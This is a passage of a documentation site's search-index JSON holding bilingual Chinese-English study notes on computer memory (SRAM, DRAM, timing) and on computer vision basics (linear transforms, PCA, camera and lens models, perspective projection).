15\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter6/#serial-transfers-and-microoperations","title":"Serial Transfers and Microoperations","text":"<p>\u5bc4\u5b58\u5668\u4e00\u6b21\u53ea\u63a5\u53d7\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u53ef\u4ee5\u4f7f\u5f97\u65f6\u949f\u5468\u671f\u66f4\u77ed\uff0c\u4f46\u662f\u4f20\u8f93\u76f8\u540c\u4f4d\u6570\u7684\u6570\u636e\u9700\u8981\u66f4\u591a\u7684\u65f6\u949f\u5468\u671f\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u66f4\u7b80\u5355\u7684\u7535\u8def\u5b9e\u73b0 microoperations: By using two shift registers for operands, a full adder, and a flip flop (for the carry), we can add two numbers serially, starting at the least significant bit.</p> <p>Serial Adder</p> <p></p>"},{"location":"cs/computer_logic/chapter7/","title":"Memory Basics","text":""},{"location":"cs/computer_logic/chapter7/#memory-definitions","title":"Memory Definitions","text":"<ul> <li> <p>Memory: A collection of storage cells together with the necessary circuits to transfer information to and from them.</p> <p>\u4e00\u7ec4\u5b58\u50a8\u5355\u5143\u7684\u96c6\u5408\uff0c\u53ef\u4ee5\u8bfb\u3001\u5199\u3002</p> </li> <li> <p>Memory Organization: The basic architectural structure of a memory in terms of how data is accessed.</p> <p>\u5185\u5b58\u7684\u67b6\u6784\uff0c\u5185\u5b58\u80fd\u5b58\u653e\u591a\u5c11\u6570\u636e\uff0c\u4e00\u4e2a\u5b57\u591a\u5c11\u4f4d\uff0c\u5982\u4f55\u8bbf\u95ee\u5185\u5b58\u7b49\u3002</p> </li> <li> <p>Random Access Memory (RAM): A memory organized such that data can be transferred to or from any cell (or collection of cells) in a time that is not dependent upon the particular cell selected.</p> </li> <li> <p>Memory Address: A vector of bits that identifies a particular memory element (or collection of elements).</p> <p>\u5185\u5b58\u5730\u5740\uff0c\u4e00\u4e2a\u5217\u8868\u7684\u7f16\u53f7\uff0c\u901a\u8fc7\u7f16\u53f7\u53ef\u4ee5\u8bfb\u5199\u5185\u5b58\u7684\u6570\u636e\u3002</p> </li> <li> <p>Typical data elements:</p> <ul> <li>Bit: A single binary digit (0 or 1).</li> <li>Byte: A group of 8 bits.</li> <li> <p>Word: A group of bits that is treated as a unit by the computer hardware.</p> <p>\u4e00\u6b21\u8bfb\u5199\u7684\u6570\u636e\u5355\u5143\uff0c\u4e00\u822c\u4e3a 8 \u4f4d\u6216 16 \u4f4d\u3002</p> </li> </ul> </li> <li> <p>Memory Data: a bit or a collection of bits to be stored into or accessed from memory cells.</p> <p>\u5199\u5165\u6216\u8bfb\u53d6\u7684\u6570\u636e\u3002</p> </li> <li> <p>Memory Operations: operations on memory data supported by the memory unit. </p> </li> </ul>"},{"location":"cs/computer_logic/chapter7/#memory-organization","title":"Memory Organization","text":"<p>Organized as an indexed array of words. Value of the index for each word is the memory address.</p> <p>Memory Block Diagram</p> <p>A basic memory system is shown here \u57fa\u7840\u7684\u5185\u5b58\u7cfb\u7edf\uff1a</p> <p></p> <ul> <li>k address lines are decoded to address \\(2^k\\) words of memory.</li> <li>Each word is n bits.</li> <li>Read and Write are single control lines defining the simplest of memory operations.</li> </ul>"},{"location":"cs/computer_logic/chapter7/#memory-operations","title":"Memory Operations","text":"<p>Memory operations require the following:</p> <ul> <li>Data: data written to, or read from, memory as required by the operation. \u8f93\u5165\u6216\u8f93\u51fa\u7684\u6570\u636e\u3002</li> <li> <p>Address: specifies the memory location to operate on. The address lines carry this information into the memory.</p> <p>Typically: n bits specify locations of \\(2^n\\) words.</p> </li> <li> <p>An operation: Information sent to the memory and interpreted as control information which specifies the type of operation to be performed. \u63a7\u5236\u4fe1\u53f7\uff0c\u6307\u5b9a\u64cd\u4f5c\u7c7b\u578b\u3002</p> <p>Typically: a single bit specifies READ or WRITE.</p> <ul> <li> <p>Read Memory: an operation that reads a data value stored in memory:</p> <p>\u8bfb\u53d6\u5185\u5b58\u4e2d\u7684\u6570\u636e\u3002</p> <ol> <li>Place a valid address on the address lines.</li> <li>Toggle the memory read control line.</li> <li>Wait for the read data to become stable.</li> </ol> </li> <li> <p>Write Memory: an operation that writes a data value to memory:</p> <p>\u5199\u5165\u6570\u636e\u5230\u5185\u5b58\u3002</p> <ol> <li>Place a valid address on the address lines and valid data on the data lines.</li> <li>Toggle the memory write control line.</li> </ol> </li> </ul> </li> </ul>"},{"location":"cs/computer_logic/chapter7/#memory-operation-timing","title":"Memory Operation Timing","text":"<p>Most basic memories are asynchronous</p> <ul> <li> <p>Read Timing</p> <p></p> <p><code>data valid</code> \u4e4b\u524d\u9700\u8981\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\uff0c\u56e0\u4e3a\u5185\u5b58\u9700\u8981\u4e00\u5b9a\u7684\u65f6\u95f4\u8bfb\u53d6\u6570\u636e\u3002\u8fd9\u4e2a\u65f6\u95f4\u53d6\u51b3\u4e8e\u5185\u5b58\u7684\u901f\u5ea6\u3002</p> </li> <li> <p>Write Timing</p> <p></p> <p>\u5728 R/W \u4fe1\u53f7\u4e0b\u964d\u65f6\u8981\u5c06 addr \u9501\u5b58\u8d77\u6765\uff0c\u4e0a\u5347\u65f6\u8981\u9884\u5148\u628a\u6570\u636e\u51c6\u5907\u597d\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter7/#ram-integrated-circuits","title":"RAM Integrated Circuits","text":"<p>Types of random access memory:</p> <ul> <li> <p>Static RAM (SRAM): information stored in latches</p> <p>\u4fe1\u606f\u5b58\u50a8\u5728\u9501\u5b58\u5668\u4e2d\uff0c\u4e0d\u9700\u8981\u5237\u65b0\u3002</p> </li> <li> <p>Dynamic RAM (DRAM): information stored as electrical charges on capacitors</p> <p>\u4fe1\u606f\u5b58\u50a8\u5728\u7535\u5bb9\u4e2d\uff0c\u9700\u8981\u5237\u65b0\u3002</p> <ul> <li>Charge \"leaks\" off: \u7535\u5bb9\u4f1a\u6f0f\u7535</li> <li>Periodic refresh  of charge required: \u9700\u8981\u5b9a\u671f\u5237\u65b0</li> </ul> </li> </ul> <p>Dependence on Power Supply:</p> <ul> <li>Volatile: loses stored information when power turned off. \u6389\u7535\u540e\u4f1a\u4e22\u5931\u6570\u636e\u3002</li> <li>Non-volatile: retains information when power turned off. \u6389\u7535\u540e\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u3002</li> </ul> <p>Address bus and Data bus: \u6570\u636e\u603b\u7ebf\u548c\u5730\u5740\u603b\u7ebf</p> <ul> <li>Address bus: \u4f20\u8f93\u5730\u5740\uff0c\\(\u5b58\u50a8\u5bb9\u91cf=2^{\u5730\u5740\u603b\u7ebf\u4f4d\u6570}\\)</li> <li>Data bus: \u4f20\u8f93\u6570\u636e\uff0c\\(\u4e00\u6b21\u5904\u7406\u6570\u636e\u7684\u4f4d\u5bbd=\u6570\u636e\u603b\u7ebf\u4f4d\u6570\\)</li> </ul>"},{"location":"cs/computer_logic/chapter7/#static-ram","title":"Static RAM","text":""},{"location":"cs/computer_logic/chapter7/#storage-cell","title":"Storage Cell","text":"<ul> <li> <p>SR Latch: stores one bit of information</p> <p>\u4e00\u4e2a\u9501\u5b58\u5668\uff0c\u5b58\u50a8\u4e00\u4f4d\u4fe1\u606f\u3002</p> </li> <li> <p>Select: select input for control</p> <p>\u63a7\u5236\u4fe1\u53f7\uff0c\u63a7\u5236\u8bfb\u5199\u3002\u5982\u679c\u4e3a 1\uff0c\u90a3\u4e48\u6570\u636e\u4f1a\u88ab\u5199\u5165\u5230\u9501\u5b58\u5668\u4e2d\u3002\u5982\u679c\u4e3a 0\uff0c\u90a3\u4e48\u9501\u5b58\u5668\u7684\u503c\u4e0d\u4f1a\u88ab\u4fee\u6539\u548c\u8bfb\u51fa\u3002</p> </li> <li> <p>Dual Rail Data Inputs \\(B\\) and \\(\\bar B\\): dual rail \u6570\u636e\u8f93\u5165</p> </li> <li>Dual Rail Data Outputs \\(C\\) and \\(\\bar C\\): dual rail \u6570\u636e\u8f93\u51fa</li> </ul>"},{"location":"cs/computer_logic/chapter7/#bit-slice","title":"Bit Slice","text":"<p>Bit Select: \u63a7\u5236\u6574\u4e2a bit slice \u7684\u5de5\u4f5c\uff0c\u5f53 Bit Select \u4e3a 0 \u65f6\uff0c\u6574\u4e2a bit slice \u4e0d\u5de5\u4f5c\uff1b\u5f53 Bit Select \u4e3a 1 \u65f6\uff0cbit slice \u7684\u8bfb\u5199\u6536 Read/Write \u63a7\u5236\u3002</p> <p>\u5f53 Bit Select \u4e3a 1 \u65f6\uff1a</p> <ul> <li>Read Operation: Read/Write \u4e3a 1\uff0c\u6b64\u65f6 Data in \u5904\u4e0e\u95e8\u4e0d\u5de5\u4f5c\uff0c\u9501\u5b58\u5668\u4fdd\u6301\u539f\u6765\u7684\u503c\u3002\u6839\u636e Word Select \u9009\u62e9\u8f93\u51fa\u7684\u6570\u636e\u3002</li> <li>Write Operation: Read/Write \u4e3a 0\uff0c\u6b64\u65f6 Data in \u5904\u4e0e\u95e8\u5de5\u4f5c\uff0c\u6839\u636e Word Select \u9009\u62e9\u5199\u5165\u7684\u6570\u636e\u3002</li> </ul>"},{"location":"cs/computer_logic/chapter7/#cell-arrays-and-coincident-selection","title":"Cell Arrays and Coincident Selection","text":"<ul> <li>Decoder: \u8bd1\u7801\u5668\uff0c\u5c06\u5730\u5740\u8bd1\u7801\u4e3a\u63a7\u5236\u4fe1\u53f7\uff0c\u5c06\u5bf9\u5e94\u5730\u5740\u4e0a RAM cell \u7684 Select \u7f6e\u4e3a 1\u3002</li> <li>\u4e09\u6001\u95e8\uff1a\u4f7f\u5f97 RAM chip \u7684\u8f93\u51fa\u53ef\u4ee5\u4e0e\u603b\u7ebf\u8fde\u63a5\u3002</li> </ul> <p>\u884c\u5217\u8bd1\u7801</p> <p>\\(8\\times 2\\) RAM</p> <p></p> <p>RAM slice 0 \u548c 2\u30011 \u548c 3 \u4f5c\u4e3a\u6570\u636e\u7684\u9ad8\u4f4e\u4f4d\u3002</p>"},{"location":"cs/computer_logic/chapter7/#making-larger-memories","title":"Making Larger Memories","text":"<p>\u9ad8\u4e24\u4f4d\u63a5\u5165\u8bd1\u7801\u5668\uff0c\u4f4e\u4e24\u4f4d\u63a5\u5165 RAM chip\uff0c\u51cf\u5c11\u590d\u6742\u5ea6\u3002</p>"},{"location":"cs/computer_logic/chapter7/#making-wider-memories","title":"Making Wider Memories","text":"<p>\u589e\u52a0\u4f4d\u5bbd\uff0c\u6bcf\u5757 RAM chip \u5c31\u4ee3\u8868\u6700\u540e\u8f93\u51fa\u7684\u67d0\u4e00\u4f4d\u3002</p>"},{"location":"cs/computer_logic/chapter7/#dynamic-ram","title":"Dynamic RAM","text":"<p>Basic Principle: Storage of information on capacitors. \u4fe1\u606f\u5b58\u50a8\u5728\u7535\u5bb9\u4e0a\u3002</p>"},{"location":"cs/computer_logic/chapter7/#dram-cell","title":"DRAM Cell","text":"<ul> <li>Capacitor: \u7535\u5bb9</li> <li>Switch: \u5f00\u5173</li> </ul> <p>\u57fa\u672c\u529f\u80fd\uff1a</p> <ul> <li>Store: \u7528\u4e09\u6001\u95e8\u5c06\u7535\u5bb9\u9501\u4f4f\u3002</li> <li>Write: \u5c06\u7535\u5bb9\u5145\u7535\u6216\u653e\u7535\u3002</li> <li>Read: \u8bfb\u53d6\u7535\u5bb9\u7684\u7535\u538b\u3002</li> </ul>"},{"location":"cs/computer_logic/chapter7/#dram-slice","title":"DRAM Slice","text":""},{"location":"cs/computer_logic/chapter7/#block-diagram","title":"Block Diagram","text":"<p>Read and Write Operations: \u5206\u5f00\u8bfb\u53d6\u884c\u5217\u5730\u5740\uff0cCPU \u63d0\u4f9b\u4fe1\u53f7\u544a\u8bc9 DRAM \u5f53\u524d\u8bfb\u53d6\u7684\u662f\u884c\u5730\u5740\u8fd8\u662f\u5217\u5730\u5740\u3002</p> <ul> <li> <p>Application of row address: \\(\\overline{RAS}\\)</p> <p>\u8bfb\u53d6\u884c\u5730\u5740\uff0c\u5c06\u884c\u5730\u5740\u653e\u5165\u8bd1\u7801\u5668\uff0c\u5c06\u5bf9\u5e94\u7684\u884c\u7684\u7535\u5bb9\u653e\u5165\u8bfb\u53d6\u7535\u8def\u3002</p> </li> <li> <p>Application of column address: \\(\\overline{CAS}\\)</p> <p>\u8bfb\u53d6\u5217\u5730\u5740\uff0c\u5c06\u5217\u5730\u5740\u653e\u5165\u8bd1\u7801\u5668\uff0c\u5c06\u5bf9\u5e94\u7684\u5217\u7684\u7535\u5bb9\u653e\u5165\u8bfb\u53d6\u7535\u8def\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter7/#dynamic-ram-timing","title":"Dynamic RAM Timing","text":"<ol> <li> <p>Read Timing</p> <p></p> </li> <li> <p>Write Timing</p> <p></p> </li> </ol>"},{"location":"cs/computer_logic/chapter7/#dram-types","title":"DRAM Types","text":"<ul> <li>Synchronous DRAM (SDRAM)</li> <li>Double Data Rate SDRAM (DDR SDRAM)</li> <li>RAMBUS\u00ae DRAM (RDRAM)</li> </ul> <p>Synchronous DRAM:</p> <p>Transfers to and from the DRAM are synchronize with a clock\u3002</p> <p>\u6709\u65f6\u949f\uff0c\u4e00\u6b21\u53ef\u4ee5\u8bfb\u51fa\u591a\u4e2a\u6570\u636e\u3002</p> <p>Synchronous DRAM - burst size=4</p> <p></p> <p>Double Data Rate SDRAM:</p> <p>Transfers data on both edges of the clock. \u5728\u65f6\u949f\u7684\u4e0a\u5347\u6cbf\u548c\u4e0b\u964d\u6cbf\u90fd\u53ef\u4ee5\u8bfb\u51fa\u6570\u636e\u3002</p> <p>Provides a transfer rate of 2 data words per clock cycle.</p> <p>RAMBUS\u00ae DRAM:</p> <p>Uses a packet-based bus for interaction between the RDRAM ICs and the memory bus to the processor.</p> <p>The bus consists of:</p> <ul> <li>A 3-bit row address bus</li> <li>A 5-bit column address bus</li> <li>A 16 or 18-bit (for error correction) data bus</li> </ul> <p>\u4f7f\u7528\u5305\u4f20\u8f93\uff0c\u4e00\u6b21\u53ef\u4ee5\u8bfb\u51fa\u591a\u4e2a\u6570\u636e\u3002</p>"},{"location":"cs/cv/chapter1/","title":"\u7ebf\u4ee3\u77e5\u8bc6\u56de\u987e","text":""},{"location":"cs/cv/chapter1/#vectors","title":"Vectors","text":"<p>\u4e00\u822c\u8bb0\u4f5c \\(\\vec{a}\\) \u6216\u8005 \\(\\mathbf{a}\\)\u3002</p>"},{"location":"cs/cv/chapter1/#normalization","title":"Normalization","text":"<p>\u8bb0\u4f5c \\(\\lVert \\vec{a} \\rVert\\)\u3002</p> <p>Unit vector: \\(\\hat{a} = \\vec{a} / \\lVert \\vec{a} \\rVert\\)\u3002</p>"},{"location":"cs/cv/chapter1/#dot-product","title":"Dot Product","text":"<p>\\(\\vec{a} \\cdot \\vec{b} = \\lVert \\vec{a} \\rVert \\lVert \\vec{b} \\rVert \\cos \\langle \\vec{a}, \\vec{b} \\rangle\\)\u3002</p> <p>\\(\\cos \\langle \\vec{a}, \\vec{b} \\rangle = \\frac{\\vec{a} \\cdot \\vec{b}}{\\lVert \\vec{a} \\rVert \\lVert \\vec{b} \\rVert}\\)\u3002</p> <p>\u5bf9\u4e8e\u5355\u4f4d\u5411\u91cf\uff0c\\(\\cos \\langle \\vec{a}, \\vec{b} \\rangle = \\vec{a} \\cdot \\vec{b}\\)\u3002</p>"},{"location":"cs/cv/chapter1/#projection","title":"Projection","text":"<p>\u5c06 \\(\\vec{b}\\) \u6295\u5f71\u5230 \\(\\vec{a}\\) \u4e0a\uff1a</p> \\[     \\vec{b}_{\\bot} = k \\hat{a} = \\lVert \\vec{b} \\rVert \\cos \\langle \\vec{a}, \\vec{b} \\rangle \\hat{a} \\]"},{"location":"cs/cv/chapter1/#matrices","title":"Matrices","text":""},{"location":"cs/cv/chapter1/#identity-matrix-and-inverses","title":"Identity Matrix and Inverses","text":"<p>\\(A A^{-1} = A^{-1} A = I\\)</p> <p>\\((A B)^{-1} = B^{-1} A^{-1}\\)</p>"},{"location":"cs/cv/chapter1/#transformations","title":"Transformations","text":"<p>\u5b9e\u8d28\u662f\u5bf9\u6bcf\u4e2a\u70b9\u7684\u5750\u6807\u8fdb\u884c\u53d8\u6362\u3002</p> <p>\\(x' = Ax\\)</p>"},{"location":"cs/cv/chapter1/#scaling","title":"Scaling","text":"\\[     A =     \\begin{bmatrix}         s_x &amp; 0 \\\\         0 &amp; s_y     \\end{bmatrix} \\]"},{"location":"cs/cv/chapter1/#reflection","title":"Reflection","text":"<p>\u6cbf y \u8f74\u53cd\u5c04\uff1a</p> \\[     A =     \\begin{bmatrix}         -1 &amp; 0 \\\\         0 &amp; 1     \\end{bmatrix} \\]"},{"location":"cs/cv/chapter1/#shear","title":"Shear","text":"\\[     A =     \\begin{bmatrix}         1 &amp; a \\\\         0 &amp; 1     \\end{bmatrix} \\]"},{"location":"cs/cv/chapter1/#rotation","title":"Rotation","text":"<p>\u4ee5\u539f\u70b9\u4e3a\u4e2d\u5fc3\u9006\u65f6\u9488\u65cb\u8f6c \\(\\theta\\)\uff1a</p> \\[     A =     \\begin{bmatrix}         \\cos \\theta &amp; -\\sin \\theta \\\\         \\sin \\theta &amp; \\cos \\theta     \\end{bmatrix} \\]"},{"location":"cs/cv/chapter1/#linear-transforms","title":"Linear Transforms","text":"\\[     M =     \\begin{bmatrix}         a &amp; b \\\\         c &amp; d     \\end{bmatrix} \\] <p>\\(\\vec{v'} = M \\vec{v}\\)</p>"},{"location":"cs/cv/chapter1/#translation","title":"Translation","text":"<p>\u5e73\u79fb\u4e0d\u662f\u7ebf\u6027\u53d8\u6362\u3002</p> \\[     \\begin{aligned}         x' &amp;= x + t_x \\\\         y' &amp;= y + t_y     \\end{aligned} \\] \\[     \\begin{pmatrix}         x' \\\\         y'     \\end{pmatrix}     =     \\begin{pmatrix}         x \\\\         y     \\end{pmatrix}     +     \\begin{pmatrix}         t_x \\\\         t_y     \\end{pmatrix} \\]"},{"location":"cs/cv/chapter1/#affine-transforms","title":"Affine Transforms","text":"<p>\u4eff\u5c04\u53d8\u6362\u662f\u7ebf\u6027\u53d8\u6362\u548c\u5e73\u79fb\u7684\u7ec4\u5408\u3002</p> \\[     \\begin{pmatrix}         x' \\\\         y'     \\end{pmatrix}     =     \\begin{bmatrix}         a &amp; b \\\\         c &amp; d     \\end{bmatrix}     \\begin{pmatrix}         x \\\\         y     \\end{pmatrix}     +     \\begin{pmatrix}         t_x \\\\         t_y     \\end{pmatrix} \\]"},{"location":"cs/cv/chapter1/#homogeneous-coordinates","title":"Homogeneous Coordinates","text":"<p>\u9f50\u6b21\u5750\u6807\uff0c\u5c06 2D \u5750\u6807\u8f6c\u6362\u4e3a 3D \u5750\u6807\u3002</p> \\[     \\begin{pmatrix}         x' \\\\         y' \\\\         1     \\end{pmatrix}     =     \\begin{bmatrix}         a &amp; b &amp; t_x \\\\         c &amp; d &amp; t_y \\\\         0 &amp; 0 &amp; 1     \\end{bmatrix}     \\begin{pmatrix}         x \\\\         y \\\\         1     \\end{pmatrix} \\]"},{"location":"cs/cv/chapter1/#inverse-transform","title":"Inverse Transform","text":"<p>\u5c06\u53d8\u6362\u540e\u7684\u5750\u6807\u8f6c\u6362\u56de\u539f\u5750\u6807\uff0c\u5176\u4ee3\u8868\u7684\u53d8\u6362\u77e9\u9635\u4e3a\u539f\u53d8\u6362\u77e9\u9635\u7684\u9006\u77e9\u9635\u3002</p> \\[     \\begin{aligned}         \\vec{v'} &amp;= M \\vec{v} \\\\         \\vec{v} &amp;= M^{-1} \\vec{v'}     \\end{aligned} \\]"},{"location":"cs/cv/chapter1/#matrix-determinants","title":"Matrix Determinants","text":"<p>3 \u7ef4\u7a7a\u95f4\u4e2d\uff0c\u4e09\u4e2a\u5411\u91cf\u7ec4\u6210\u7684\u5e73\u884c\u516d\u9762\u4f53\u7684\u4f53\u79ef\uff0c\u4e3a\u4e09\u4e2a\u5411\u91cf\u7ec4\u6210\u7684\u884c\u5217\u5f0f\u7684\u7edd\u5bf9\u503c\u3002</p>"},{"location":"cs/cv/chapter1/#eigenvectors-and-eigenvalues","title":"Eigenvectors and Eigenvalues","text":"<p>\u7279\u5f81\u503c\u548c\u7279\u5f81\u5411\u91cf\u3002</p> \\[     A \\vec{v} = \\lambda \\vec{v} \\] <p>\\(\\lambda\\) \u4e3a\u7279\u5f81\u503c\uff0c\\(\\vec{v}\\) \u4e3a\u7279\u5f81\u5411\u91cf\u3002</p>"},{"location":"cs/cv/chapter1/#eigen-decomposition","title":"Eigen Decomposition","text":"\\[     A = Q \\Lambda Q^{-1} \\] <p>\u5176\u4e2d\uff0c\\(Q\\) \u4e3a\u7279\u5f81\u5411\u91cf\u77e9\u9635\uff0c\\(\\Lambda\\) \u4e3a\u7279\u5f81\u503c\u77e9\u9635\u3002</p>"},{"location":"cs/cv/chapter1/#pca-principal-component-analysis","title":"PCA (Principal Component Analysis)","text":"<p>\u4e3b\u6210\u5206\u5206\u6790\uff0c\u662f\u4e00\u79cd\u964d\u7ef4\u6280\u672f\u3002\u5bfb\u627e\u7279\u5f81\u7a7a\u95f4\u4e2d\u7684\u65b9\u5411\uff0c\u4f7f\u5f97\u6570\u636e\u5728\u8fd9\u4e9b\u65b9\u5411\u4e0a\u7684\u6295\u5f71\u65b9\u5dee\u6700\u5927\u3002</p> <p>\u5148\u5c06\u6570\u636e\u4e2d\u5fc3\u5316\uff0c\u5373\u5c06\u6a2a\u7eb5\u5750\u6807\u51cf\u53bb\u5747\u503c\u3002</p> \\[     A =      \\begin{bmatrix}         x_1 &amp; y_1 \\\\         x_2 &amp; y_2 \\\\         \\vdots &amp; \\vdots \\\\         x_n &amp; y_n     \\end{bmatrix} \\] <p>\u77e9\u9635 \\(A^T A\\) \u6709\u4e24\u4e2a\u7279\u5f81\u5411\u91cf\uff0c\u5bf9\u5e94\u4e24\u4e2a\u7279\u5f81\u503c\u3002</p> <p>\u5176\u4e2d\u8f83\u5927\u7684\u7279\u5f81\u503c\u5bf9\u5e94\u7684\u7279\u5f81\u5411\u91cf\u5373\u4e3a\u4e3b\u6210\u5206\uff0c\u7279\u5f81\u503c\u4e3a\u6b64\u65b9\u5411\u4e0a\u7684\u65b9\u5dee\u3002</p>"},{"location":"cs/cv/chapter2/","title":"\u56fe\u50cf\u7684\u5f62\u6210","text":""},{"location":"cs/cv/chapter2/#camera-model","title":"Camera Model","text":""},{"location":"cs/cv/chapter2/#pinhole-camera","title":"Pinhole Camera","text":"<p>\u5c0f\u5b54\u6210\u50cf\u539f\u7406\u3002\u5b54\u5f84\u8d8a\u5c0f\uff0c\u6210\u50cf\u8d8a\u6e05\u6670\uff0c\u4f46\u662f\u5149\u7ebf\u8d8a\u6697</p>"},{"location":"cs/cv/chapter2/#lens-camera","title":"Lens Camera","text":"<p>\u900f\u955c\u6210\u50cf\u539f\u7406\u3002</p> <p>Focal Length: \u7126\u8ddd\uff0c\u8bb0\u4f5c f</p> <p>\u9ad8\u65af\u516c\u5f0f\uff1a\\(\\frac{1}{f} = \\frac{1}{o} + \\frac{1}{i}\\)\u3002\u5176\u4e2d o \u4e3a\u7269\u8ddd\uff0ci \u4e3a\u50cf\u8ddd\uff08\u8981\u6295\u5f71\u5230\u5149\u8f74\u4e0a\uff09</p>"},{"location":"cs/cv/chapter2/#image-magnification","title":"Image Magnification","text":"<p>\u5149\u5b66\u53d8\u7126\uff1a\u7126\u8ddd\u8d8a\u5927\uff0c\u6210\u50cf\u8d8a\u5927\u3002\u957f\u7126\u955c\u5934\uff08\u7126\u8ddd\u5927\uff09\uff0c\u5e7f\u89d2\u955c\u5934\uff08\u7126\u8ddd\u5c0f\uff09</p>"},{"location":"cs/cv/chapter2/#field-of-view-fov","title":"Field of View (FOV)","text":"<p>\u89c6\u573a\u89d2\uff0c\u5e7f\u89d2\u955c\u5934\u89c6\u573a\u89d2\u5927\uff0c\u957f\u7126\u955c\u5934\u89c6\u573a\u89d2\u5c0f\u3002\u8fd8\u53d6\u51b3\u4e8e\u4f20\u611f\u5668\u7684\u5927\u5c0f\uff08sensor size\uff09</p>"},{"location":"cs/cv/chapter2/#aperture","title":"Aperture","text":"<p>\u5149\u5708\uff0c\u63a7\u5236\u8fdb\u5165\u76f8\u673a\u7684\u5149\u7ebf\u91cf\u3002\u5149\u5708\u8d8a\u5927\uff0c\u8fdb\u5165\u7684\u5149\u7ebf\u8d8a\u591a\uff0c\u6210\u50cf\u8d8a\u4eae\u3002\u5149\u5708\u8d8a\u5c0f\uff0c\u8fdb\u5165\u7684\u5149\u7ebf\u8d8a\u5c11\uff0c\u6210\u50cf\u8d8a\u6697\u3002</p> <p>f-number: \u5149\u5708\u5927\u5c0f\u7684\u6807\u51c6\uff0c\\(N = \\frac{f}{D}\\)\uff0c\u5176\u4e2d f \u4e3a\u7126\u8ddd\uff0cD \u4e3a\u5149\u5708\u76f4\u5f84</p>"},{"location":"cs/cv/chapter2/#lens-defocus","title":"Lens Defocus","text":"<p>\u5931\u7126\uff0c\u5149\u7ebf\u4e0d\u805a\u7126\u5728\u4f20\u611f\u5668\u4e0a\uff0c\u5bfc\u81f4\u56fe\u50cf\u6a21\u7cca\u3002\u901a\u8fc7\u8c03\u6574\u7126\u8ddd\uff0c\u4f7f\u5f97\u7269\u4f53\u6210\u50cf\u5728\u4f20\u611f\u5668\u4e0a\u3002</p> <p>\u901a\u8fc7\u8c03\u6574\u7126\u8ddd\uff0c\u4f7f\u5f97\u7269\u4f53\u6210\u50cf\u5728\u4f20\u611f\u5668\u4e0a\u3002</p> <p>\u5931\u7126\u4f1a\u4ea7\u751f blur circle\uff0c\u5176\u5927\u5c0f\u4e3a \\(b = \\frac{D}{i'} \\cdot |i\u2018 - i|\\)\uff0c\u5176\u4e2d D \u4e3a\u5149\u5708\u76f4\u5f84\uff0ci' \u4e3a\u50cf\u8ddd\uff0ci \u4e3a\u4f20\u611f\u5668\u5230\u900f\u955c\u7684\u8ddd\u79bb\u3002</p> <p>\u51cf\u5c0f\u5149\u5708\u76f4\u5f84\uff0c\u53ef\u4ee5\u51cf\u5c0f\u5931\u7126\u7684\u5f71\u54cd\u3002</p>"},{"location":"cs/cv/chapter2/#depth-of-field-dof","title":"Depth of Field (DOF)","text":"<p>\u666f\u6df1\uff0c\u7269\u4f53\u6210\u50cf\u6e05\u6670\u7684\u8303\u56f4\u3002DOF \u53d7\u5149\u5708\u5927\u5c0f\u3001\u7126\u8ddd\u3001\u7269\u8ddd\u3001\u4f20\u611f\u5668\u5927\u5c0f\u7b49\u56e0\u7d20\u5f71\u54cd\u3002\u4ea7\u751f\u539f\u56e0\uff1a\u4f20\u611f\u5668\u662f\u79bb\u6563\u7684\u3002</p> <p>\u7279\u5199\uff1a\u5149\u5708\u5927\uff0c\u7126\u8ddd\u5c0f\uff0cDOF \u5c0f\uff0c\u80cc\u666f\u6a21\u7cca\uff1b\u5168\u666f\uff1a\u5149\u5708\u5c0f\uff0c\u7126\u8ddd\u5927\uff0cDOF \u5927\uff0c\u80cc\u666f\u6e05\u6670\u3002</p>"},{"location":"cs/cv/chapter2/#geometric-image-formation","title":"Geometric Image Formation","text":"<p>\u4e09\u7ef4\u5230\u4e8c\u7ef4\u7684\u6295\u5f71\u8fc7\u7a0b\u3002</p>"},{"location":"cs/cv/chapter2/#perspective-projection","title":"Perspective Projection","text":"<p>\\(u = x \\cdot \\frac{f}{z}, v = y \\cdot \\frac{f}{z}\\)</p> <p>Homogeneous Coordinates</p> <p>Converting to homogeneous coordinates:</p> \\[ (x, y) \\Rightarrow \\begin{bmatrix} x \\\\ y \\\\ 1 \\end{bmatrix} \\] \\[ (x, y, z) \\Rightarrow \\begin{bmatrix} x \\\\ y \\\\ z \\\\ 1 \\end{bmatrix} \\] <p>Converting from homogeneous to Cartesian:</p> \\[ \\begin{bmatrix} x \\\\ y \\\\ w \\end{bmatrix} \\Rightarrow (x/w, y/w) \\] \\[ \\begin{bmatrix} x \\\\ y \\\\ z \\\\ w \\end{bmatrix} \\Rightarrow (x/w, y/w, z/w) \\] <p>\u4e0a\u9762\u7684\u53d8\u6362\u53ef\u4ee5\u5199\u6210\uff1a</p> \\[ \\begin{bmatrix} f &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; f &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\end{bmatrix} \\begin{bmatrix} x \\\\ y \\\\ z \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} fx \\\\ fy \\\\ z \\end{bmatrix} \\cong \\begin{bmatrix} x \\cdot \\frac{f}{z} \\\\ y \\cdot \\frac{f}{z} \\\\ 1 \\end{bmatrix} \\]"},{"location":"cs/cv/chapter2/#vanishing-points","title":"Vanishing Points","text":"<p>\u706d\u70b9\uff0c\u5e73\u884c\u7ebf\u5728\u6210\u50cf\u5e73\u9762\u4e0a\u7684\u4ea4\u70b9\u3002\u53ea\u53d6\u51b3\u4e8e\u7ebf\u7684\u65b9\u5411\u3002</p>"},{"location":"cs/cv/chapter2/#vanishing-line","title":"Vanishing Line","text":"<p>\u706d\u7ebf\uff0c\u4e24\u7ec4\u5e73\u884c\u7ebf\u7684\u706d\u70b9\u7684\u8fde\u7ebf\uff0c\u5bf9\u5e94\u4e09\u7ef4\u7a7a\u95f4\u4e2d\u7684\u5e73\u9762\uff0c\u540c\u4e00\u5e73\u9762\u4e0a\u7684\u5e73\u884c\u7ebf\u7684\u706d\u70b9\u5728\u540c\u4e00\u706d\u7ebf\u4e0a\u3002</p>"},{"location":"cs/cv/chapter2/#perspective-distortion","title":"Perspective 